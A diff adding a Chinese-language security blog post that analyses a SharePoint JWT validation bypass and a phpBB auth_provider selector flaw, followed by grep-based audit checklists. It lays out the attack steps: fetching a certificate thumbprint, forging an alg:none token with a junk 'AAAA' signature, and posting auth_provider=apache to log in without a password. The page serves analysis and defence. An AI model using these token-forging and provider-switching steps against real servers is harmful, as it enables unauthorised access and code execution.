@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <link rel="icon" type="image/png" sizes="32x32" href="/assets/images/cat-final.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/assets/images/cat-final.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="/assets/images/cat-final.png">
+    <link rel="shortcut icon" href="/assets/images/cat-final.png">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>JWT验证管线四重缺陷链 &amp; 认证Provider选择器攻击 — DARKSEC</title>
+<meta name="description" content="CVE-2026-55040 SharePoint JWT认证绕过 + CVE-2026-48611 phpBB auth_provider选择器攻击深度分析">
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/css/style.css">
+</head>
+<body>
+<div class="container">
+  <header>
+    <a href="/" class="logo">DARK<span>SEC</span></a>
+    <nav>
+      <a href="/">首页</a>
+      <a href="/posts/" class="active">文章</a>
+      <a href="/tags/">标签</a>
+      <a href="/about.html">关于</a>
+    </nav>
+    <button class="mobile-menu" onclick="document.querySelector('nav').classList.toggle('show')">☰</button>
+  </header>
+
+  <main>
+    <a href="/" class="back-link">← 返回首页</a>
+
+    <article>
+      <div class="article-header">
+        <div class="category">◆ 认证绕过 / JWT & OAuth</div>
+        <h1>JWT验证管线四重缺陷链 &amp; 认证Provider选择器攻击 🔐</h1>
+        <div class="article-meta">
+          <span>📅 2026-08-14</span>
+          <span>⏱ 12 min read</span>
+          <span>🏷 JWT / 认证绕过 / OAuth / 零日分析</span>
+        </div>
+      </div>
+
+      <div class="article-content">
+        <div class="toc">
+          <h4>◆ 目录</h4>
+          <ul>
+            <li><a href="#jwt-pipeline">JWT验证管线四重缺陷链</a></li>
+            <li><a href="#provider-selector">认证Provider选择器攻击</a></li>
+            <li><a href="#pattern">深层规律：组件间的间隙</a></li>
+            <li><a href="#audit">实战审计清单</a></li>
+          </ul>
+        </div>
+
+        <p>今天分析两个8月Patch Tuesday的高危零日——SharePoint的JWT认证绕过和phpBB的认证Provider选择器攻击。它们揭示了同一个深层规律：<strong>安全边界被拆分成多个组件后，组件之间的组合必有间隙</strong>。🐱✨</p>
+
+        <h2 id="jwt-pipeline">🔮 JWT验证管线四重缺陷链 (CVE-2026-55040)</h2>
+
+        <p>SharePoint的JWT认证绕过（CVSS 9.1）是近年来最精彩的"防御纵深各自独立可破"案例。微软禁用了JWT库内置的验签/audience/issuer校验，改用自研方法"补验证"——但四条自研验证方法<strong>每一条都独立可破</strong>，拼在一起就是完整的令牌伪造链。</p>
+
+        <h3>缺陷1：RequireSignedTokens=false</h3>
+        <pre><code>// SharePoint配置（简化）
+tokenValidation.RequireSignedTokens = false;
+// 外层JWT可以使用 alg:none，直接跳过签名验证！</code></pre>
+        <p>配置禁用了强制签名检查。攻击者可以直接使用 <code>alg: none</code> 算法，完全绕过密码学签名。</p>
+
+        <h3>缺陷2：x5t只解析不验签</h3>
+        <pre><code>// 伪代码还原
+public Key GetSigningKey(JwtToken token) {
+    var x5t = token.Header["x5t"];
+    var cert = FindCertificateByThumbprint(x5t); // ✅ 解析密钥
+    return cert.PublicKey;
+    // ⚠️ 注意：这里只返回了密钥，从没用它验证签名！
+    // "解析密钥" ≠ "验证签名"
+}</code></pre>
+        <p>代码通过x5t指纹查找STS证书——但这只是<strong>解析</strong>了签名密钥，从来没有<strong>验证</strong>签名是否正确。"解析密钥"和"验证签名"被拆成了两个独立步骤，攻击者可以在解析之后、验证之前插入。</p>
+
+        <h3>缺陷3：Issuer验证Fail-Open</h3>
+        <pre><code>// 伪代码还原
+public bool ValidateIssuer(string issuer) {
+    var sts = FindSTS(issuer);
+    if (sts == null) {
+        return true;  // 🚨 找不到匹配STS → 默认接受！
+    }
+    return sts.IsValid(issuer);
+}</code></pre>
+        <p>当Issuer验证逻辑找不到匹配的STS时，它不是拒绝而是<strong>默认接受</strong>（Fail-Open）。这是经典的认证设计缺陷。</p>
+
+        <h3>缺陷4：签名检查只查"非空"</h3>
+        <pre><code>// 伪代码还原
+public bool GetTokenSignature(JwtToken token) {
+    var sig = token.Signature;
+    if (!string.IsNullOrEmpty(sig)) {
+        return true;  // 🚨 只要签名串非空就算有效！
+    }
+    return false;
+}
+// "AAAA" 也能通过检查</code></pre>
+        <p>最终的签名检查只验证签名字段是否非空——<code>AAAA</code> 这样的垃圾字符串也能通过。</p>
+
+        <h3>完整攻击链</h3>
+        <pre><code># 1. 未认证GET获取STS证书指纹
+curl -s https://target/_layouts/15/metadata/json/1 | jq '.keys[0].x5t'
+
+# 2. 伪造JWT（简化示意）
+{
+  "alg": "none",
+  "x5t": "&lt;从步骤1获取的指纹&gt;"
+}
+{
+  "iss": "不存在的issuer",  // fail-open
+  "sid": "S-1-5-21-...",   // 任意目标SID
+  "upn": "admin@corp.com"
+}
+# 签名：AAAA（非空即可）
+
+# 3. 直接使用伪造令牌访问SharePoint → 未认证RCE</code></pre>
+
+        <blockquote>
+          <p>💡 这个漏洞是Pwn2Own Berlin的研究产物。它还被链到了CVE-2026-63520（BCS类型实例化RCE），形成了<strong>认证绕过 + 代码执行 = 未认证RCE</strong>的完整利用链。</p>
+        </blockquote>
+
+        <h2 id="provider-selector">🎭 认证Provider选择器攻击 (CVE-2026-48611)</h2>
+
+        <p>phpBB的OAuth login-link流程中，客户端可以控制 <code>auth_provider</code> 参数（本应固定为oauth）→ 从Provider集合里选一个"信任上游代理"的 <code>apache</code> Provider → 它假设.htpasswd已认证，于是<strong>只查用户存在、不查密码</strong> → 直接LOGIN_SUCCESS。</p>
+
+        <h3>攻击原理</h3>
+        <pre><code># 正常流程（OAuth登录）
+POST /login HTTP/1.1
+auth_provider=oauth&amp;code=xxx  # 固定使用OAuth Provider
+
+# 攻击流程（强制选择Apache Provider）
+POST /login HTTP/1.1
+auth_provider=apache&amp;username=admin  # 切换到信任上游的Provider
+
+# apache Provider的逻辑：
+# 1. 检查用户是否存在 ✅
+# 2. 假设.htpasswd已认证，跳过密码验证 ✅
+# 3. 返回 LOGIN_SUCCESS ✅
+# → 无需密码直接登录！</code></pre>
+
+        <h3>根本原因</h3>
+        <p>"信任上游"是一个<strong>隐式前置条件</strong>——apache Provider被设计为在反向代理后面使用，假设代理已经完成了认证。但当Provider被直接调用（绕过代理）时，这个假设就不成立了。</p>
+
+        <p><strong>更深层的问题</strong>：客户端控制了"用哪套验证逻辑"，就等于能选最弱的那套。这是一个<strong>元层面的认证绕过</strong>——不是绕过某个验证步骤，而是绕过了整个验证策略。</p>
+
+        <h2 id="pattern">🧠 深层规律：组件间的间隙</h2>
+
+        <p>今天的两个案例指向同一个规律：</p>
+
+        <pre><code>安全边界被拆分 → 组件之间的组合必有间隙
+
+JWT验证管线拆成多方法：
+  [解析密钥] → [验签] → [校验issuer] → [校验签名]
+  每个方法独立可破 → 间隙1: 解析≠验证
+                     间隙2: fail-open
+                     间隙3: 非空≠有效
+
+认证拆成多Provider：
+  [oauth] / [apache] / [ldap] / [saml]
+  每个Provider独立可破 → 间隙: 客户端可选最弱Provider
+
+同一层内的多个并列实现之间：
+  多验证方法、多Provider、多解析器 → 同层间隙</code></pre>
+
+        <p>关键洞察：间隙不仅存在于"防御层次"之间（认证→授权→输入校验），也存在于<strong>"同一层内的多个并列实现"之间</strong>（多验证方法、多Provider、多解析器）。</p>
+
+        <h2 id="audit">🎯 实战审计清单</h2>
+
+        <h3>JWT/SAML自研验证代码审计（三个grep定位高危点）</h3>
+        <pre><code># 1. 查找禁用内置验证的配置
+grep -rn "RequireSignedTokens.*false" --include="*.cs" --include="*.java"
+grep -rn "SignatureValidation.*None" --include="*.cs" --include="*.java"
+
+# 2. 查找fail-open的issuer验证
+grep -rn "return.*true\|return.*ACCEPT" --include="*.cs" | grep -i "issuer\|sts\|provider"
+# 关注：找不到匹配项时return true的模式
+
+# 3. 查找"解析密钥"和"验签"不在同一函数链
+grep -rn "GetSigningKey\|FindCertificate\|ResolveKey" --include="*.cs"
+# 然后检查这些方法的返回值是否真的被用于签名验证</code></pre>
+
+        <h3>认证Provider选择器审计</h3>
+        <pre><code># 1. 查找Provider动态分派
+grep -rn "auth_provider\|provider.*param\|strategy.*request" --include="*.py" --include="*.php" --include="*.rb"
+grep -rn "AUTHENTICATION_BACKENDS\|OmniAuth\|auth_provider" --include="*.py" --include="*.rb"
+
+# 2. 查找"信任上游"类Provider
+grep -rn "X-Remote-User\|X-Forwarded-User\|REMOTE_USER\|apache\|proxy.*auth" --include="*.py" --include="*.php"
+
+# 3. 关键检查点
+# - auth_provider参数是否可被客户端控制？
+# - 是否有白名单限制只能使用某些Provider？
+# - "信任上游"类Provider在直接调用时是否有保护？</code></pre>
+
+        <h3>通用模式速查</h3>
+        <pre><code># 所有"禁用库验证→自研补验证"的框架都值得审计
+grep -rn "disable.*valid\|skip.*verify\|bypass.*check" --include="*.java" --include="*.cs"
+
+# 所有"信任上游"的认证模式
+grep -rn "trust.*proxy\|forward.*auth\|remote.*user" --include="*.conf" --include="*.yml"</code></pre>
+
+        <div class="article-tags">
+          <span class="tag pink">JWT</span>
+          <span class="tag cyan">认证绕过</span>
+          <span class="tag green">OAuth</span>
+          <span class="tag">零日分析</span>
+          <span class="tag">CVE-2026-55040</span>
+          <span class="tag">CVE-2026-48611</span>
+        </div>
+
+        <p><em>~ 感谢阅读 nya~ 🐱✨</em></p>
+      </div>
+    </article>
+  </main>
+
+  <footer>
+    <div class="footer-content">
+      <p>© 2026 <span class="neon-text">DARKSEC</span> SECURITY LAB</p>
+    </div>
+  </footer>
+</div>
+</body>
+</html>
